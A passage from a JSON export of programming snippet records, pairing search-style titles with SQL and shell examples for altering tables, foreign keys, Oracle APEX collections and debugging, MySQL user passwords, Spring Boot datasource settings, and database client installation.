    "description": "-- Get ORACLE Session IDs (SID and SERIAL#) SELECT SID, SERIAL#, STATUS, SERVER FROM V$SESSION WHERE USERNAME = '<username>'; -- Kill session (and wait for rollback if any...) ALTER SYSTEM KILL SESSION 'SID,SERIAL#' IMMEDIATE;\n",
    "reg_date": "2021-10-12T09:54:08.000Z"
  },
  {
    "id": 341,
    "keyword": null,
    "link": null,
    "title": " alter table add check constraint oracle",
    "description": "ALTER TABLE suppliers ADD CONSTRAINT check_supplier_name   CHECK (supplier_name IN ('IBM', 'Microsoft', 'NVIDIA'));\nALTER TABLE table_name ADD CONSTRAINT constraint_name CHECK (column_name condition) [DISABLE];\n",
    "reg_date": "2021-10-12T09:54:08.000Z"
  },
  {
    "id": 342,
    "keyword": null,
    "link": null,
    "title": " alter table add column",
    "description": "ALTER TABLE Customers ADD Email varchar(255); \nALTER TABLE table_name ADD column_name datatype;  --example ALTER TABLE Customers ADD Email varchar(255);\nALTER TABLE table_name ADD column_name varchar(50);\nALTER TABLE table_name ADD column_name datatype;\nALTER TABLE table ADD COLUMN column VARCHAR (255) NOT NULL AFTER column;\nALTER TABLE table_name  ADD column_name datatype;\n",
    "reg_date": "2021-10-12T09:54:08.000Z"
  },
  {
    "id": 343,
    "keyword": null,
    "link": null,
    "title": " alter table add column and foreign key mysql",
    "description": "-- On Create CREATE TABLE tableName (     ID INT,     SomeEntityID INT,     PRIMARY KEY (ID),     FOREIGN KEY (SomeEntityID)         REFERENCES SomeEntityTable(ID)         ON DELETE CASCADE );  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;     -- Add FK with a specific name  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD CONSTRAINT fk_name   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;\n# A foreign key is essentially a reference to a primary # key in another table.  # A Simple table of Users,  CREATE TABLE users( \tuserId INT NOT NULL,   \tusername VARCHAR(64) NOT NULL,   \tpasswd VARCHAR(32) NOT NULL,   \tPRIMARY KEY(userId); ); # Lets add a LEGIT user! INSERT INTO users VALUES(1000,\"Terry\",\"Teabagface$2\");  # We will create an order table that holds a reference # to an order made by our Terry CREATE TABLE orders( \torderId INT NOT NULL,   \torderDescription VARCHAR(255),   \tordererId INT NOT NULL,   \tPRIMARY KEY(orderId),   \tFOREIGN KEY (ordererId) REFERENCES users(userId) ); # Now we can add an order from Terry INSERT INTO orders VALUES(0001,\"Goat p0rn Weekly\",1000);  # Want to know more about the plight of Goats? # See the link below\nALTER TABLE database.table   ADD COLUMN columnname INT DEFAULT(1),   ADD FOREIGN KEY fk_name(fk_column) REFERENCES reftable(refcolumn) ON DELETE CASCADE;\n",
    "reg_date": "2021-10-12T09:54:08.000Z"
  },
  {
    "id": 344,
    "keyword": null,
    "link": null,
    "title": " alter table add column forigen key mysql",
    "description": "ALTER TABLE table_name DROP CONSTRAINT fk_name;\n-- On Create CREATE TABLE tableName (     ID INT,     SomeEntityID INT,     PRIMARY KEY (ID),     FOREIGN KEY (SomeEntityID)         REFERENCES SomeEntityTable(ID)         ON DELETE CASCADE );  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;     -- Add FK with a specific name  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD CONSTRAINT fk_name   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;\n# A foreign key is essentially a reference to a primary # key in another table.  # A Simple table of Users,  CREATE TABLE users( \tuserId INT NOT NULL,   \tusername VARCHAR(64) NOT NULL,   \tpasswd VARCHAR(32) NOT NULL,   \tPRIMARY KEY(userId); ); # Lets add a LEGIT user! INSERT INTO users VALUES(1000,\"Terry\",\"Teabagface$2\");  # We will create an order table that holds a reference # to an order made by our Terry CREATE TABLE orders( \torderId INT NOT NULL,   \torderDescription VARCHAR(255),   \tordererId INT NOT NULL,   \tPRIMARY KEY(orderId),   \tFOREIGN KEY (ordererId) REFERENCES users(userId) ); # Now we can add an order from Terry INSERT INTO orders VALUES(0001,\"Goat p0rn Weekly\",1000);  # Want to know more about the plight of Goats? # See the link below\nALTER TABLE tryholpz_demo07.core_modules  ADD COLUMN belongs_to_role INT,  ADD FOREIGN KEY core_modules(belongs_to_role) REFERENCES role_specific_modules_info(id) ON DELETE CASCADE\n",
    "reg_date": "2021-10-12T09:54:08.000Z"
  },
  {
    "id": 345,
    "keyword": null,
    "link": null,
    "title": " alter table add column with default value",
    "description": "ALTER TABLE users ADD visit_number INT DEFAULT 0;\nALTER TABLE Protocols ADD ProtocolTypeID int NOT NULL DEFAULT(1)\nALTER TABLE PERSON ADD IS_ACTIVE VARCHAR2(1) DEFAULT 'N' NOT NULL\nALTER TABLE {TABLENAME}  ADD {COLUMNNAME} {TYPE} {NULL|NOT NULL}  CONSTRAINT {CONSTRAINT_NAME} DEFAULT {DEFAULT_VALUE} WITH VALUES \nALTER TABLE {TABLENAME}  ADD {COLUMNNAME} {TYPE} {NULL|NOT NULL}  CONSTRAINT {CONSTRAINT_NAME} DEFAULT {DEFAULT_VALUE} WITH VALUES  example   ALTER TABLE SomeTable         ADD SomeCol Bit NULL --Or NOT NULL.  CONSTRAINT D_SomeTable_SomeCol --When Omitted a Default-Constraint Name is autogenerated.     DEFAULT (0)--Optional Default-Constraint. WITH VALUES --Add if Column is Nullable and you want the Default Value for Existing Records. \n",
    "reg_date": "2021-10-12T09:54:09.000Z"
  },
  {
    "id": 346,
    "keyword": null,
    "link": null,
    "title": " alter table add comment oracle",
    "description": "COMMENT ON TABLE table_name IS 'A table comment'; COMMENT ON COLUMN table_name.MY_COLUMN IS 'A column comment';  SELECT * FROM ALL_TAB_COMMENTS WHERE TABLE_NAME = 'TABLE_NAME'; SELECT * FROM ALL_COL_COMMENTS WHERE TABLE_NAME = 'TABLE_NAME';\n",
    "reg_date": "2021-10-12T09:54:09.000Z"
  },
  {
    "id": 347,
    "keyword": null,
    "link": null,
    "title": " alter table add foreign key mariadb example",
    "description": "alter table caixa add foreign key (idcaixafluxo) references caixafluxo (idcaixafluxo);\n",
    "reg_date": "2021-10-12T09:54:09.000Z"
  },
  {
    "id": 348,
    "keyword": null,
    "link": null,
    "title": " alter table add foreign key mysql",
    "description": "ALTER TABLE orders ADD  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE; \nALTER TABLE table_name DROP CONSTRAINT fk_name;\n-- On Create CREATE TABLE tableName (     ID INT,     SomeEntityID INT,     PRIMARY KEY (ID),     FOREIGN KEY (SomeEntityID)         REFERENCES SomeEntityTable(ID)         ON DELETE CASCADE );  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;     -- Add FK with a specific name  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD CONSTRAINT fk_name   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;\nCREATE TABLE parent (     id INT NOT NULL,     PRIMARY KEY (id) ) ENGINE=INNODB;  CREATE TABLE child (     id INT,     parent_id INT,     INDEX par_ind (parent_id),     FOREIGN KEY (parent_id)         REFERENCES parent(id)         ON DELETE CASCADE ) ENGINE=INNODB;\nALTER TABLE `TABLE_NAME` ADD COLUMN `COLUMN_NAME` BIGINT(20) UNSIGNED NULL DEFAULT NULL AFTER `AFTER_COLUMN_NAME`,  ADD FOREIGN KEY `FOREIGN_RELATION_NAME`(`COLUMN_NAME`) REFERENCES `FOREIGN_TABLE`(`FOREIGN_COLUMN`)  ON UPDATE SET NULL ON DELETE SET NULL\nALTER TABLE tryholpz_demo07.core_modules  ADD COLUMN belongs_to_role INT,  ADD FOREIGN KEY core_modules(belongs_to_role) REFERENCES role_specific_modules_info(id) ON DELETE CASCADE\n",
    "reg_date": "2021-10-12T09:54:09.000Z"
  },
  {
    "id": 349,
    "keyword": null,
    "link": null,
    "title": " alter table add key sql server",
    "description": "ALTER TABLE Persons ADD CONSTRAINT PK_Person PRIMARY KEY (ID,LastName);\nPRIMARY KEY    -- unique identifier for the entire row of record in a table    --  can not be null and must be unique \n",
    "reg_date": "2021-10-12T09:54:09.000Z"
  },
  {
    "id": 350,
    "keyword": null,
    "link": null,
    "title": " alter table add multiple columns postgresql",
    "description": "                                     ALTER TABLE customer  ADD COLUMN fax VARCHAR, ADD COLUMN email VARCHAR;\n",
    "reg_date": "2021-10-12T09:54:09.000Z"
  },
  {
    "id": 351,
    "keyword": null,
    "link": null,
    "title": " alter table auto increment",
    "description": "ALTER TABLE users AUTO_INCREMENT=1001;\nALTER TABLE ALLITEMS CHANGE itemid itemid INT(10)AUTO_INCREMENT PRIMARY KEY;\nALTER TABLE User AUTO_INCREMENT = 1;\n",
    "reg_date": "2021-10-12T09:54:09.000Z"
  },
  {
    "id": 352,
    "keyword": null,
    "link": null,
    "title": " alter table column change data type to text mysql",
    "description": "ALTER TABLE tablename MODIFY columnname INTEGER;\n",
    "reg_date": "2021-10-12T09:54:09.000Z"
  },
  {
    "id": 353,
    "keyword": null,
    "link": null,
    "title": " alter table column size oracle",
    "description": "ALTER TABLE tablename MODIFY fieldname VARCHAR2(100);\n",
    "reg_date": "2021-10-12T09:54:09.000Z"
  },
  {
    "id": 354,
    "keyword": null,
    "link": null,
    "title": " alter table delete column",
    "description": "ALTER TABLE \"table_name\" DROP \"column_name\";\nALTER TABLE tableName DROP columnName;\nDeletes a column from a table. Example: Removes the first_name column from the users table. ALTER TABLE users DROP COLUMN first_name\nALTER TABLE \"table_name\" DROP COLUMN \"column_name\";\n",
    "reg_date": "2021-10-12T09:54:10.000Z"
  },
  {
    "id": 355,
    "keyword": null,
    "link": null,
    "title": " alter table engine mysql",
    "description": "ALTER TABLE table_name ENGINE=InnoDB;\n",
    "reg_date": "2021-10-12T09:54:10.000Z"
  },
  {
    "id": 356,
    "keyword": null,
    "link": null,
    "title": " alter table fulltext",
    "description": "ALTER TABLE table_name   ADD FULLTEXT(column_name1, column_name2,&hellip;)\n",
    "reg_date": "2021-10-12T09:54:10.000Z"
  },
  {
    "id": 357,
    "keyword": null,
    "link": null,
    "title": " alter table mysql",
    "description": "ALTER TABLE `TABLE_NAME`  \tADD `COLUMN_NAME` VARCHAR(50) NULL     AFTER `COLUMN_NAME_AFTER`;\nALTER TABLE table ADD COLUMN column VARCHAR (255) NOT NULL AFTER column;\nALTER TABLE table_name ADD [COLUMN] column_name column_definition [FIRST|AFTER existing_column];\nALTER TABLE table   ADD [COLUMN] column_name column_definition   [FIRST|AFTER existing_column];\nALTER TABLE contacts   ADD last_name varchar(40) NOT NULL     AFTER contact_id,   ADD first_name varchar(35) NULL     AFTER last_name;\nALTER TABLE `employees`CHANGE `emp_id` `emp_id` int(11) NULL;\n",
    "reg_date": "2021-10-12T09:54:10.000Z"
  },
  {
    "id": 358,
    "keyword": null,
    "link": null,
    "title": " alter table name including schema",
    "description": "ALTER TABLE domain.old RENAME TO new\n",
    "reg_date": "2021-10-12T09:54:10.000Z"
  },
  {
    "id": 359,
    "keyword": null,
    "link": null,
    "title": " alter table name sql",
    "description": "ALTER TABLE STUDENTS   RENAME TO ARTISTS;  \nALTER TABLE \"table_name\" RENAME COLUMN \"column 1\" TO \"column 2\";\nALTER TABLE `Table Name` MODIFY COLUMN `Column Name` Datatype(Size);\n-- Microsoft SQL style EXEC sp_rename 'TableOldName', 'TableNewName';\nMySQL: ALTER TABLE Customer CHANGE Address Addr char(50);  Oracle: ALTER TABLE Customer RENAME COLUMN Address TO Addr;\nALTER TABLE `db_name`.`table_name`  \tCHANGE `current_column_name` `new_column_name` datatype(size) NOT NULL COMMENT '';\n",
    "reg_date": "2021-10-12T09:54:10.000Z"
  },
  {
    "id": 360,
    "keyword": null,
    "link": null,
    "title": " alter table oracle",
    "description": "ALTER TABLE tablename MODIFY columnname varchar2(100)\nALTER TABLE table_name   RENAME COLUMN old_name TO new_name;\n{     UPDATE table-Name [[AS] correlation-Name]         SET column-Name = Value         [ , column-Name = Value} ]*         [WHERE clause] |     UPDATE table-Name         SET column-Name = Value         [ , column-Name = Value ]*         WHERE CURRENT OF }\n",
    "reg_date": "2021-10-12T09:54:10.000Z"
  },
  {
    "id": 361,
    "keyword": null,
    "link": null,
    "title": " alter table query sql server change column",
    "description": "ALTER TABLE table_name  ALTER COLUMN column_name new_data_type(size); \nALTER TABLE table_name   ALTER COLUMN column_name column_type;\nALTER TABLE employees   ALTER COLUMN last_name VARCHAR(75) NOT NULL;\nsp_rename 'table_name.old_column_name', 'new_column_name', 'COLUMN';\nALTER TABLE table_name   DROP COLUMN column_name;\nsp_rename 'employees.last_name', 'lname', 'COLUMN';\n",
    "reg_date": "2021-10-12T09:54:10.000Z"
  },
  {
    "id": 362,
    "keyword": null,
    "link": null,
    "title": " alter tablespace add datafile",
    "description": "SELECT * FROM DBA_DATA_FILES WHERE TABLESPACE_NAME = 'my_tbs' ORDER BY FILE_NAME;  ALTER TABLESPACE my_tbs ADD DATAFILE '/path/to/my_file.dbf'  \tSIZE 100M AUTOEXTEND OFF; -- Autoextend with max size: ALTER TABLESPACE my_tbs ADD DATAFILE '/path/to/my_file.dbf'  \tSIZE 10G AUTOEXTEND ON NEXT 1G MAXSIZE 32000M;     -- For TEMP tablespace: ALTER TABLESPACE my_tbs ADD TEMPFILE '/path/to/my_file.dbf'  \tSIZE 100M AUTOEXTEND OFF;\n",
    "reg_date": "2021-10-12T09:54:10.000Z"
  },
  {
    "id": 363,
    "keyword": null,
    "link": null,
    "title": " alter tablespace add datafile autoextend",
    "description": "SELECT * FROM DBA_DATA_FILES WHERE TABLESPACE_NAME = 'my_tbs' ORDER BY FILE_NAME;  ALTER TABLESPACE my_tbs ADD DATAFILE '/path/to/my_file.dbf'  \tSIZE 100M AUTOEXTEND OFF; -- Autoextend with max size: ALTER TABLESPACE my_tbs ADD DATAFILE '/path/to/my_file.dbf'  \tSIZE 10G AUTOEXTEND ON NEXT 1G MAXSIZE 32000M;     -- For TEMP tablespace: ALTER TABLESPACE my_tbs ADD TEMPFILE '/path/to/my_file.dbf'  \tSIZE 100M AUTOEXTEND OFF;\n",
    "reg_date": "2021-10-12T09:54:11.000Z"
  },
  {
    "id": 364,
    "keyword": null,
    "link": null,
    "title": " alter user mysql native password",
    "description": "ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '<password>'; \n",
    "reg_date": "2021-10-12T09:54:11.000Z"
  },
  {
    "id": 365,
    "keyword": null,
    "link": null,
    "title": " alter user root mysql",
    "description": "-- In case the UPDATE command returns \"Column 'Password' is not updatable\" run ALTER USER 'root'@'localhost' IDENTIFIED BY 'newPassword'; flush privileges;\nALTER USER 'root'@'localhost' IDENTIFIED BY 'New-Password';\nALTER USER 'root'@'localhost' IDENTIFIED BY 'newPassword'; \n",
    "reg_date": "2021-10-12T09:54:11.000Z"
  },
  {
    "id": 366,
    "keyword": null,
    "link": null,
    "title": " altering the column name in MySQL to have a default value",
    "description": "ALTER TABLE table_name ALTER COLUMN column_name SET DEFAULT 'literal';\n",
    "reg_date": "2021-10-12T09:54:11.000Z"
  },
  {
    "id": 367,
    "keyword": null,
    "link": null,
    "title": " amazon linux postgresql client",
    "description": "[ec2-user ~]$ sudo yum install -y  https://download.postgresql.org/pub/repos/yum/10/redhat/rhel-7-x86_64/pgdg-redhat10-10-2.noarch.rpm  [ec2-user ~]$ sudo sed -i \"s/rhel-\\$releasever-\\$basearch/rhel-latest-x86_64/g\" \"/etc/yum.repos.d/pgdg-10-redhat.repo\" \nyum install -y https://download.postgresql.org/pub/repos/yum/10/redhat/rhel-latest-x86_64/postgresql10-libs-10.7-2PGDG.rhel7.x86_64.rpm yum install -y https://download.postgresql.org/pub/repos/yum/10/redhat/rhel-latest-x86_64/postgresql10-10.7-2PGDG.rhel7.x86_64.rpm yum install -y https://download.postgresql.org/pub/repos/yum/10/redhat/rhel-latest-x86_64/postgresql10-server-10.7-2PGDG.rhel7.x86_64.rpm \n",
    "reg_date": "2021-10-12T09:54:11.000Z"
  },
  {
    "id": 368,
    "keyword": null,
    "link": null,
    "title": " an exception occurred while executing a transact-sql statement or batch user,group or role already",
    "description": "sp_change_users_login 'AUTO_FIX', 'someuser'\n",
    "reg_date": "2021-10-12T09:54:11.000Z"
  },
  {
    "id": 369,
    "keyword": null,
    "link": null,
    "title": " android sqlite add column if not exists",
    "description": "Cursor cursor = database.rawQuery(\"SELECT * FROM MY_TABLE\", null); // grab cursor for all data int deleteStateColumnIndex = cursor.getColumnIndex(\"MISSING_COLUMN\");  // see if the column is there if (deleteStateColumnIndex < 0) {      // missing_column not there - add it     database.execSQL(\"ALTER TABLE MY_TABLE ADD COLUMN MISSING_COLUMN int null;\"); }\n",
    "reg_date": "2021-10-12T09:54:11.000Z"
  },
  {
    "id": 370,
    "keyword": null,
    "link": null,
    "title": " android studio SQLiteDatabase delete all data in database",
    "description": "db.execSQL(\"delete from \"+ TABLE_NAME);\n",
    "reg_date": "2021-10-12T09:54:11.000Z"
  },
  {
    "id": 371,
    "keyword": null,
    "link": null,
    "title": " anonymous block plsql",
    "description": "set serveroutput on; DECLARE    v_result NUMBER; BEGIN    v_result := 1 / 0;    DBMS_OUTPUT.PUT_LINE( v_result ); EXCEPTION    WHEN ZERO_DIVIDE THEN       DBMS_OUTPUT.PUT_LINE( SQLERRM ); END;\n",
    "reg_date": "2021-10-12T09:54:11.000Z"
  },
  {
    "id": 372,
    "keyword": null,
    "link": null,
    "title": " ansi sql count duplicate rows",
    "description": "SELECT     name, email, COUNT(*) FROM     users GROUP BY     name, email HAVING      COUNT(*) > 1 \n",
    "reg_date": "2021-10-12T09:54:11.000Z"
  },
  {
    "id": 373,
    "keyword": null,
    "link": null,
    "title": " apex ACCESS DENIED",
    "description": "Shared Components > Security > Application Access Control     > Add User Role Assignment\n",
    "reg_date": "2021-10-12T09:54:12.000Z"
  },
  {
    "id": 374,
    "keyword": null,
    "link": null,
    "title": " apex ORA-20999",
    "description": "select product_name d,       --> display value        product_id   r        --> return value from product;\n",
    "reg_date": "2021-10-12T09:54:12.000Z"
  },
  {
    "id": 375,
    "keyword": null,
    "link": null,
    "title": " apex add months to date",
    "description": "SELECT sysdate + 1 FROM dual; \t\t\t\t-- Tomorrow    12/01/2021 14:27:27 SELECT trunc(sysdate) + 1 FROM dual; \t\t-- Tomorrow    12/01/2021 00:00:00 SELECT sysdate + INTERVAL '20' DAY FROM DUAL;\t\t-- 20 days ahead (other way) SELECT sysdate + 1 / 24 FROM dual;\t\t\t\t\t-- 1 hour ahead SELECT sysdate + 1 / 24 / 60 FROM dual;\t\t\t\t-- 1 minute ahead SELECT add_months(trunc(sysdate), 1) FROM dual;   \t-- 1 month ahead (no time) SELECT trunc(sysdate) + 30 FROM dual;\t\t\t\t-- 30 days ahead (no time) SELECT add_months(trunc(sysdate), +12*2) FROM dual;\t-- 2 years ahead (no time)\n(+/-)(n)(d/w/m/y)  \t-1d or +1d date before or after 1 day of the current date \t-1w or +1w date before or after 1 week of the current date \t+2m date after two months of the current date\ndate + ( ( 365 / 12 ) * Number_months )    //or    DATE(   YEAR( date ) + FLOOR( ( MONTH ( date ) + 2 - 1 ) / 12 ),   MOD( MONTH ( date ) + 2 - 1 +      IF( DAY ( date ) > CASE( MOD( MONTH( date ) + 2 - 1, 12 ) + 1,        2, 28,       4, 30,       6, 30,       9, 30,        11, 30,       31 ), 1, 0 ), 12 ) + 1,     IF( DAY( date ) > CASE( MOD( MONTH( date ) + 2 - 1, 12 ) + 1,       2, 28,        4, 30,        6, 30,        9, 30,        11, 30,        31 ),      1, DAY( date )   ) )\n",
    "reg_date": "2021-10-12T09:54:12.000Z"
  },
  {
    "id": 376,
    "keyword": null,
    "link": null,
    "title": " apex collection. delete members example",
    "description": "BEGIN     APEX_COLLECTION.DELETE_MEMBER(         p_collection_name => 'EMPLOYEES_CL',         p_seq => '2');\t-- sequence ID of the collection member to be deleted  \t-- Deletes all members having 'ADMIN' for attr n&deg;5     APEX_COLLECTION.DELETE_MEMBERS(             p_collection_name => 'EMPLOYEE_CL',             p_attr_number => 5,             p_attr_value => 'ADMIN'); END;\n",
    "reg_date": "2021-10-12T09:54:12.000Z"
  },
  {
    "id": 377,
    "keyword": null,
    "link": null,
    "title": " apex collection add element",
    "description": "BEGIN   APEX_COLLECTION.ADD_MEMBER(           P_COLLECTION_NAME => 'EMPLOYEE_COLLECTION',           P_C001 => :P2_EMP_NO,           P_C002 => :P2_EMP_NAME       ); END;\nDECLARE     CURSOR c_emp IS         SELECT EMP_NO, EMP_NAME FROM EMP; BEGIN     IF NOT APEX_COLLECTION.COLLECTION_EXISTS('EMPLOYEE_COLLECTION')     THEN APEX_COLLECTION.CREATE_COLLECTION('EMPLOYEE_COLLECTION');     ELSE APEX_COLLECTION.TRUNCATE_COLLECTION('EMPLOYEE_COLLECTION');     END IF;      FOR c IN c_emp         LOOP             APEX_COLLECTION.ADD_MEMBER(P_COLLECTION_NAME => 'EMPLOYEE_COLLECTION',                                        P_C001 => c.EMP_NO,                                        P_C002 => c.EMP_NAME                 );         END LOOP; END;\n",
    "reg_date": "2021-10-12T09:54:12.000Z"
  },
  {
    "id": 378,
    "keyword": null,
    "link": null,
    "title": " apex create collection",
    "description": "BEGIN   IF NOT APEX_COLLECTION.COLLECTION_EXISTS('EMPLOYEE_COLLECTION') THEN       APEX_COLLECTION.CREATE_COLLECTION('EMPLOYEE_COLLECTION');   END IF; END;\n",
    "reg_date": "2021-10-12T09:54:12.000Z"
  },
  {
    "id": 379,
    "keyword": null,
    "link": null,
    "title": " apex debug example",
    "description": "PROCEDURE my_proc (p_id IN NUMBER, p_emp IN emp%ROWTYPE) IS BEGIN     APEX_DEBUG.ENTER('my_proc', 'p_id', p_id, 'p_emp.id' , p_emp.id);     APEX_DEBUG.LOG_PAGE_SESSION_STATE;\t-- saves all items     MY_PACKAGE.MY_FUNCTION;\t\t\t\t     APEX_DEBUG.LOG_DBMS_OUTPUT(p_prefix=>'[Debug] ');     APEX_DEBUG.INFO('my_proc successfully finished.'); EXCEPTION     WHEN OTHERS THEN APEX_DEBUG.ERROR('Critical error %s', sqlerrm);         RAISE; END;\n",
    "reg_date": "2021-10-12T09:54:12.000Z"
  },
  {
    "id": 380,
    "keyword": null,
    "link": null,
    "title": " apex delete collection",
    "description": "BEGIN     APEX_COLLECTION.DELETE_COLLECTION(p_collection_name => 'EMPLOYEE_CL');     -- All collections belonging to current session     APEX_COLLECTION.DELETE_ALL_COLLECTIONS_SESSION;     -- All collections belonging to current user     APEX_COLLECTION.DELETE_ALL_COLLECTIONS; END;\n",
    "reg_date": "2021-10-12T09:54:12.000Z"
  },
  {
    "id": 381,
    "keyword": null,
    "link": null,
    "title": " apex enable debug session",
    "description": "-- Enable degugging for a specific, running session APEX_SESSION.set_debug (     p_session_id => 1234, \tp_level => APEX_DEBUG.c_log_level_info );   -- set NULL to disable debugging COMMIT;\n",
    "reg_date": "2021-10-12T09:54:12.000Z"
  },
  {
    "id": 382,
    "keyword": null,
    "link": null,
    "title": " apex enable log session",
    "description": "-- Enable degugging for a specific, running session APEX_SESSION.set_debug (     p_session_id => 1234, \tp_level => APEX_DEBUG.c_log_level_info );   -- set NULL to disable debugging COMMIT;\n",
    "reg_date": "2021-10-12T09:54:13.000Z"
  },
  {
    "id": 383,
    "keyword": null,
    "link": null,
    "title": " apex execute batch job",
    "description": "Id batchJobId = Database.executeBatch(new RunThisBatch(), 200);\n",
    "reg_date": "2021-10-12T09:54:13.000Z"
  },
  {
    "id": 384,
    "keyword": null,
    "link": null,
    "title": " apex navigation menu",
    "description": "Shared Components > User Interface > User Interface Attributes > Navigation Menu\n",
    "reg_date": "2021-10-12T09:54:13.000Z"
  },
  {
    "id": 385,
    "keyword": null,
    "link": null,
    "title": " apex query queue",
    "description": "select Id from Group where Type = 'Queue' \n",
    "reg_date": "2021-10-12T09:54:13.000Z"
  },
  {
    "id": 386,
    "keyword": null,
    "link": null,
    "title": " apex select list ORA-20999",
    "description": "select product_name d,       --> display value        product_id   r        --> return value from product;\n",
    "reg_date": "2021-10-12T09:54:13.000Z"
  },
  {
    "id": 387,
    "keyword": null,
    "link": null,
    "title": " apex set debug level",
    "description": "f?p=app:page:session::YES/LEVELx::: -- x is between 1 (least detailed) and 9 (most detailed) f?p=100:1:&APP_SESSION.::YES f?p=100:1:&APP_SESSION.::LEVEL5 -- OR APEX_DEBUG.enable(p_level) -- OR APEX_SESSION.set_debug(p_session_id,p_level)    -- p_level: NULL to disable\nPROCEDURE my_proc (p_id IN NUMBER, p_emp IN emp%ROWTYPE) IS BEGIN     APEX_DEBUG.ENTER('my_proc', 'p_id', p_id, 'p_emp.id' , p_emp.id);     APEX_DEBUG.LOG_PAGE_SESSION_STATE;\t-- saves all items     MY_PACKAGE.MY_FUNCTION;\t\t\t\t     APEX_DEBUG.LOG_DBMS_OUTPUT(p_prefix=>'[Debug] ');     APEX_DEBUG.INFO('my_proc successfully finished.'); EXCEPTION     WHEN OTHERS THEN APEX_DEBUG.ERROR('Critical error %s', sqlerrm);         RAISE; END;\n",
    "reg_date": "2021-10-12T09:54:13.000Z"
  },
  {
    "id": 388,
    "keyword": null,
    "link": null,
    "title": " append column sql",
    "description": "ALTER TABLE Customers ADD Email varchar(255); \nALTER TABLE table_name ADD column_name datatype;  --example ALTER TABLE Customers ADD Email varchar(255);\n",
    "reg_date": "2021-10-12T09:54:13.000Z"
  },
  {
    "id": 389,
    "keyword": null,
    "link": null,
    "title": " application.properties spring boot mysql",
    "description": "spring.datasource.url=jdbc:mysql://localhost:yourDatabase?serverTimezone=UTC //set username and password as environment variables under application configuration so that the real ones won't be pushed to github, only their aliases: USERNAME and PASSWORD in this case.  spring.datasource.username=${USERNAME} // instead of ${USERNAME} you may use a generic one as well, like 'root' but then it will be pushed to github with the app so anyone can see you username and password. spring.datasource.password=${PASSWORD} spring.jpa.hibernate.ddl-auto=create-drop //running after the first time (when the tables are created in the database) or later when you want the data remain for later tests you have to change the key word 'create-drop' to 'update' so that the data remains in place. Oops! the database itself without the tables needs to be created manually first. spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.MySQL5Dialect spring.logging.level.org.hibernate.SQL=debug spring.jpa.show-sql=true\nspring.jpa.hibernate.ddl-auto=update spring.datasource.url=jdbc:mysql://${MYSQL_HOST:localhost}:3306/db_example spring.datasource.username=springuser spring.datasource.password=ThePasswordCopy\nspring.datasource.url=jdbc:mysql://localhost:3306/myDb spring.datasource.username=user1 spring.datasource.password=pass spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver\n",
    "reg_date": "2021-10-12T09:54:13.000Z"
  },
  {
    "id": 390,
    "keyword": null,
    "link": null,
    "title": " apt install sql server",
    "description": "sudo apt-get update sudo apt-get install -y mssql-server \nwget -qO- https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add - \nsudo add-apt-repository \"$(wget -qO- https://packages.microsoft.com/config/ubuntu/16.04/mssql-server-2019.list)\" \nsudo add-apt-repository \"$(wget -qO- https://packages.microsoft.com/config/ubuntu/18.04/mssql-server-2019.list)\" \nsudo /opt/mssql/bin/mssql-conf setup \nsudo add-apt-repository \"$(wget -qO- https://packages.microsoft.com/config/ubuntu/20.04/mssql-server-2019.list)\" \nsystemctl status mssql-server --no-pager \n",
    "reg_date": "2021-10-12T09:54:13.000Z"
  },
  {
    "id": 391,
    "keyword": null,
    "link": null,
    "title": " arithmetic operators in sql",
    "description": "You use the operators in any clause (except the From clause)  With Date and Timestamp - can only use addition and subtraction  Add (+), Subtract (-), Multiply (*), Divide (/)\n+ Add &ndash; Subtract * Multiply / Divide % Modulo\nLOGICAL OPERATORS? ALL\t    (TRUE if all of the subquery values meet the condition)\t AND\t    (TRUE if all the conditions separated by AND is TRUE)\t ANY\t    (TRUE if any of the subquery values meet the condition)\t BETWEEN\t(TRUE if the operand is within the range of comparisons)\t EXISTS\t(TRUE if the subquery returns one or more records) IN\t    TRUE if the operand is equal to one of a list of expressions)\t LIKE\t(TRUE if the operand matches a pattern)\t NOT\t    (Displays a record if the condition(s) is NOT TRUE)\t OR\t    (TRUE if any of the conditions separated by OR is TRUE)\t SOME\t(TRUE if any of the subquery values meet the condition)\nYou use the operators in any clause (except the From clause)  With Date and Timestamp - can only use addition and subtraction Add (+), Subtract (-), Multiply (*), Divide (/)\n",
    "reg_date": "2021-10-12T09:54:13.000Z"
  },
  {
    "id": 392,
    "keyword": null,
    "link": null,
    "title": " ascending order and where in sql",
    "description": "SELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2;\t \t-- col1 DESC then col2 ASC\n",
    "reg_date": "2021-10-12T09:54:13.000Z"
  },
  {
    "id": 393,
    "keyword": null,
    "link": null,
    "title": " ascending order in sql",
